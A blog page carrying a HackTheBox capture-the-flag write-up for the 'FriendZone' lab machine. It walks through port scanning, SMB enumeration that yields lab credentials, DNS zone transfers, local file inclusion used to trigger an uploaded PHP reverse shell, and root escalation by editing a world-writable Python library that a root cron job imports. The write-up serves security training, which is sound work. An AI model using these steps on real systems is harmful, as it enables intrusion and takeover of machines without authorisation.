<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
  <head>
  <meta charset="utf-8" />
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>HackTheBox - WriteUp 4 &middot; Pat~ Pat~ Meow~</title>
  <meta name="description" content="HackTheBox ç»ƒæ‰‹ - FriendZone - DNS Zone Transfer Attack" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" />
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
  <link rel="stylesheet" href="https://www.kmahyyg.xyz/css/main.min.css" />
  
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-123948588-1', 'auto');
	
	ga('send', 'pageview');
}
</script>

  <style>
    body {
      background: #ecedef url("https://alicdn.kmahyyg.xyz/asset_files/aether/bgimg.webp") repeat;
    }
  </style>
</head>
  <body class="single-body">
    <nav class="nav-bar side-padding">
  <h1 class="nav-header"><a href="https://www.kmahyyg.xyz/" class="nav-text">Patrick Young</a></h1>
  <div class="hamburger-menu">
    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
      <span></span>
      <span></span>
    </button>
    <ul id="menu" class="hamburger-menu-overlay">
      <li><a href="https://www.kmahyyg.xyz/" class="hamburger-menu-overlay-link">Home</a></li>
      <li><a href="https://www.kmahyyg.xyz/express-page/" class="hamburger-menu-overlay-link">Express Inc</a></li>
      <li><a href="https://www.kmahyyg.xyz/about-me-page/" class="hamburger-menu-overlay-link">About</a></li>
      <li><a href="https://www.kmahyyg.xyz/archlinux-bug-page/" class="hamburger-menu-overlay-link">Arch Linux</a></li>
      <li><a href="https://www.kmahyyg.xyz/donate-page/" class="hamburger-menu-overlay-link">Donate</a></li>
      <li><a href="https://www.kmahyyg.xyz/categories/code" class="hamburger-menu-overlay-link">Code</a></li><li><a href="https://www.kmahyyg.xyz/categories/life" class="hamburger-menu-overlay-link">Life</a></li><li><a href="https://www.kmahyyg.xyz/categories/network" class="hamburger-menu-overlay-link">Network</a></li><li><a href="https://www.kmahyyg.xyz/categories/school" class="hamburger-menu-overlay-link">School</a></li><li><a href="https://www.kmahyyg.xyz/categories/tech" class="hamburger-menu-overlay-link">Tech</a></li>
    </ul>
  </div>
</nav>
    <main class="content side-text-padding">
      <article class="post ">
        <header class="post-header">
        	<h1 class="post-title">HackTheBox - WriteUp 4</h1>
          <p class="post-date">Posted <time datetime="2019-05-18">May 18, 2019</time></p>
        </header>
        
        <picture class="post-figure">
            
            <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
          <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" >
        </picture>
        
        

<h1 id="friendzone">FriendZone</h1>

<h2 id="before-attack">Before Attack</h2>

<p><code>nmap -A -Pn -p1-65535 10.10.10.123</code></p>

<p>Response:</p>

<pre><code>PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0ðŸ‡©ðŸ‡ª86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
</code></pre>

<p>Found <code>53/tcp</code> &amp; SMB, check SMB first.</p>

<h3 id="smb">SMB</h3>

<p><code>nmap --script smb-enum-shares -p139,445 10.10.10.123</code> found shares and their absolute path.</p>

<p>Use <code>smbclient</code> to access:</p>

<pre><code>$ smbclient -L -U guest -N //10.10.10.123

        Sharename       Type      Comment                                                            
        ---------       ----      -------                                                         
        print$          Disk      Printer Drivers                                                 
        Files           Disk      FriendZone Samba Server Files /etc/Files  {NO PERM}                         
        general         Disk      FriendZone Samba Server Files             {RO}                                          
        Development     Disk      FriendZone Samba Server Files             {RW}              
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))   
</code></pre>

<p>Get the files from share:  <code>/mnt/smb/general/creds.txt</code></p>

<pre><code>creds for the admin THING:
admin:WORKWORKHhallelujah@#
</code></pre>

<h3 id="53-tcp-dns">53/TCP DNS</h3>

<p>Trying to access the web, notice you that you cannot access via IP directly, so let&rsquo;s make the <code>/etc/hosts</code> first.</p>

<p>Do a zone transfer scan:</p>

<pre><code>â•°â”€ dig axfr friendzoneportal.red @10.10.10.123  

; &lt;&lt;&gt;&gt; DiG 9.14.1 &lt;&lt;&gt;&gt; axfr friendzoneportal.red @10.10.10.123
;; global options: +cmd
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.   604800  IN      AAAA    ::1
friendzoneportal.red.   604800  IN      NS      localhost.
friendzoneportal.red.   604800  IN      A       127.0.0.1
admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
files.friendzoneportal.red. 604800 IN   A       127.0.0.1
imports.friendzoneportal.red. 604800 IN A       127.0.0.1
vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 1025 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: äºŒ 5æœˆ 14 15:08:02 CST 2019
;; XFR size: 9 records (messages 1, bytes 309)
</code></pre>

<pre><code>â•°â”€ dig axfr friendzone.red @10.10.10.123                         

; &lt;&lt;&gt;&gt; DiG 9.14.1 &lt;&lt;&gt;&gt; axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 1023 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: äºŒ 5æœˆ 14 15:07:49 CST 2019
;; XFR size: 8 records (messages 1, bytes 289)
</code></pre>

<p>Finally, these sites are accessible via web:</p>

<pre><code>$ cat /etc/hosts

10.10.10.123 friendzoneportal.red
10.10.10.123 friendzone.red
10.10.10.123 administrator1.friendzone.red
10.10.10.123 uploads.friendzone.red
</code></pre>

<h2 id="start-attack">Start attack</h2>

<h3 id="gobuster-first">Gobuster first</h3>

<p><code>gobuster -k -u https://administrator1.friendzone.red -w /root/dictlist/DirBuster-Lists/directory-list-2.3-medium.txt -x php -o gobus123.txt</code></p>

<p>Response:</p>

<pre><code>/images (Status: 301)
/login.php (Status: 200)
/dashboard.php (Status: 200)
/timestamp.php (Status: 200)
</code></pre>

<p>Timestamp?? Really strange&hellip;</p>

<h3 id="access-as-admin">Access as admin</h3>

<p>Trying to access VSFTPD, got permission denied, password incorrect.</p>

<p>Trying to access <code>https://administrator1.friendzone.red/login.php</code>, get: <code>Login Done ! visit /dashboard.php</code></p>

<p>Check the dashboard, found <code>https://administrator1.friendzone.red/login.php?image_name=a.jpg&amp;pagename=timestamp</code></p>

<p>Using the last result of gobuster, you may guess there&rsquo;s a LFI here. That&rsquo;s it.</p>

<blockquote>
<p><a href="https://uploads.friendzone.red/">https://uploads.friendzone.red/</a>   {UPLOAD FORM NOT WORKING, RABBIT HOLE}</p>
</blockquote>

<p>The only way to upload the file is via SMB, you have RW permission only on Development.</p>

<p>So upload a php reverse shell from pentest monkey and LFI it through the param <code>pagename</code> without file extension.</p>

<h3 id="reverse-shell">Reverse shell</h3>

<p>Access: <code>https://administrator1.friendzone.red/login.php?image_name=a.jpg&amp;pagename=shell</code></p>

<p>Before that, don&rsquo;t forget to modify the php reverse shell and get your <code>nc</code> ready in the terminal.</p>

<p>Next, just walk through the <code>/var/www</code> (the home of www-data). You will find a credential and login into ssh to get a interactive shell now.</p>

<pre><code>$ cat /var/www/mysql_data.conf

db_user=friend
db_name=FZ
db_pass=Agpyu12!0.213$
</code></pre>

<h3 id="interactive-shell-and-privilege-escalation">Interactive Shell and Privilege Escalation</h3>

<p>Run LinEnum and Pspy and also LinuxPrivilegeChecker, Got the following results:</p>

<pre><code>PSPY: /bin/sh -c /opt/server_admin/reporter.py (UID=0, Python2.7, ExecStart by CRON)

LinEnum:

[-] Accounts that have recently used sudo:
/home/friend/.sudo_as_admin_successful

PrivilegeChecker:

[+] World Writable Files
    -rwxrw-rw- 1 nobody nogroup 11 May 17 15:58 /etc/Development/hell.txt
    -rwxrw-rw- 1 nobody nogroup 31 May 17 16:17 /etc/Development/hsi.php
    -rwxrw-rw- 1 nobody nogroup 604 May 17 12:03 /etc/Development/hello.php
    -rwxrw-rw- 1 nobody nogroup 68 May 17 15:54 /etc/Development/fpin.php
    -rwxrw-rw- 1 nobody nogroup 5493 May 17 18:48 /etc/Development/prsb.php
    -rw-rw-rw- 1 root root 0 May 17 11:45 /sys/kernel/security/apparmor/.remove
    -rw-rw-rw- 1 root root 0 May 17 11:45 /sys/kernel/security/apparmor/.replace
    -rw-rw-rw- 1 root root 0 May 17 11:45 /sys/kernel/security/apparmor/.load
    -rw-rw-rw- 1 root root 0 May 17 11:45 /sys/kernel/security/apparmor/.access
    --w--w--w- 1 root root 0 May 17 19:08 /sys/fs/cgroup/memory/cgroup.event_control
    -rwxrwxrwx 1 root root 25910 Jan 15 22:19 /usr/lib/python2.7/os.py
</code></pre>

<p>So, let&rsquo;s check <code>/opt/server_admin/reporter.py</code> :</p>

<ul>
<li>Permission 644, We only can read.</li>
<li>A health check script written in python to send a mail, but the send command was commented.</li>
<li><code>import os</code></li>
</ul>

<p><code>/usr/lib/python2.7/os.py</code> Should only be readable in normal system, however, here, we got 777: So just modify the file to do anything you want, just don&rsquo;t forget always put your code at the file end.</p>

<p>DONE.</p>

      </article>
      <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "kmahyyg" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
    </main>
    <nav class="end-nav side-padding">
      
      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
  href="https://www.kmahyyg.xyz/hioscp/2019-htb-writeup3/" class="card blog-card" rel="bookmark" >
    
    <div class="card-img-container">
      <p class="card-img-overlay">Next Article</p>
      <picture>
        
        <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
        <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" class="card-img" >
      </picture>
    </div>
    
  <article class="card-body">
    <h2 class="card-title">HackTheBox - WriteUp 3</h2>
    <p class="card-text">HackTheBox ç»ƒæ‰‹ - Chaos - Latex Privilege Escalation</p>
    <div class="card-subtext muted-text">
      <p>Posted <time datetime="2019-05-14 514:00">May 14, 2019</time></p>
      <p>#tech </p>
    </div>
  </article>
</a>
      
      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
  href="https://www.kmahyyg.xyz/" class="card home-card" style="background-image: url( https://alicdn.kmahyyg.xyz/asset_files/aether/backtohome.webp )" rel="bookmark" >
  Home
</a>
    </nav>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"
    onload="renderMathInElement(document.body);"></script>
<script src="https://www.kmahyyg.xyz/js/core.js"></script>
<script>
  hljs.initHighlightingOnLoad();
</script>
  </body>
</html>